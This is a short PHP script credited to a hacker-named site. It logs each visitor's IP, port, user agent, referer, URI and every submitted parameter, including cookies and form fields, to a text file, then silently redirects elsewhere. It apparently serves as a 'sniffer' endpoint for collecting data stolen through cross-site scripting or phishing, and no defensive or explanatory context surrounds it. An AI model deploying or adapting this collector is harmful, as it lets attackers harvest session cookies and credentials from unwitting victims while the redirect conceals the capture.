<?php

/**
 * @http://xaker26.com
 * @copyleft 2011
 */

@include 'config.php';
$req=array(
	'HTTP_REFERER'=>$_SERVER['HTTP_REFERER'],
	'HTTP_USER_AGENT'=>$_SERVER['HTTP_USER_AGENT'],
	'REMOTE_ADDR'=>$_SERVER['REMOTE_ADDR'],
	'REMOTE_PORT'=>$_SERVER['REMOTE_PORT'],
	'REQUEST_URI'=>$_SERVER['REQUEST_URI'],
	'REQUEST_TIME'=>$_SERVER['REQUEST_TIME'],
);
$desc=fopen('logs.txt','at+');
fwrite($desc,print_r($req,true)."\n\n\n".print_r($_REQUEST,true)."\n\n\n=====================\n\n\n");
fclose($desc);

header('Location: '.$loc);

?>
